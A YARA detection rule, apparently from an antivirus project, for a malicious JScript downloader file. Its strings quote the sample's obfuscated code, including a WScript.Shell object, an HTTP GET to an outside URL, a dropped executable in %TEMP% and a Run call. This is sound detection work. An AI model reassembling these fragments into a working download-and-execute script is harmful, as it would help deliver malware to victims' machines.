rule sig_20160328_cfe086d079e8cce7ed64feb3cb6d5596 {
  meta:
    description = "datamaliciousorder - file 20160328_cfe086d079e8cce7ed64feb3cb6d5596.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e90f39857701a2a3d739167b7237599a79cdb4d9e96b54fd0d25bb5e26324a2e"

  strings:
    $s1  = "function Yidyvzfqph() {return Ltcspm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"up4N4x9PgDE9.exe\";};" fullword ascii
    $s2  = "do {WScript[Nspjufirgw](Nvvih() * 11)} while (Pkwnxjn[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Fshlzbm(Axegrguro, Pzvwqrtjcv){return Axegrguro - Pzvwqrtjcv;};" fullword ascii
    $s4  = "Pkwnxjn[Fgqjzxuyjg](\"GET\", \"http://myplaymobil.co.uk/k3iad\", false);" fullword ascii
    $s5  = "var Ltcspm = function Nnqxysvdm() {return WScript[Nobxgaqhk](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Sqylmivi() {return ((Zzsjvtwa == true) && (Zzsjvtwa == Edrsifsky)) ? 1 : Aqxgsa;};" fullword ascii
    $s7  = "function Cpqalpw(Uhovp){Ltcspm[\"Run\"](Uhovp, Aqxgsa, Aqxgsa);};" fullword ascii
    $s8  = "function Nvvih(){return 22;};" fullword ascii
    $s9  = "return Fshlzbm(Npgxnqatjl, Uixndy);" fullword ascii
    $s10 = "var Edrsifsky = false;" fullword ascii
    $s11 = "var Xatqmphff = false;" fullword ascii
    $s12 = "function Fwurctmour()" fullword ascii
    $s13 = "function Etgrjgrqnp(){return Nobxgaqhk;};" fullword ascii
    $s14 = "Zzsjvtwa = true; " fullword ascii
    $s15 = "function Peicpgklf(Izdjr) {var Oryqow = (1, 2, 3, 4, 5, Izdjr); return Oryqow;};" fullword ascii
    $s16 = "function Lkshwr(){return Pcensvj;};" fullword ascii
    $s17 = "var Zzsjvtwa = false;" fullword ascii
    $s18 = "var Iemoeeuk = new this[\"Date\"]();" fullword ascii
    $s19 = " while (Grymrhoqw){" fullword ascii
    $s20 = "Edrsifsky = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}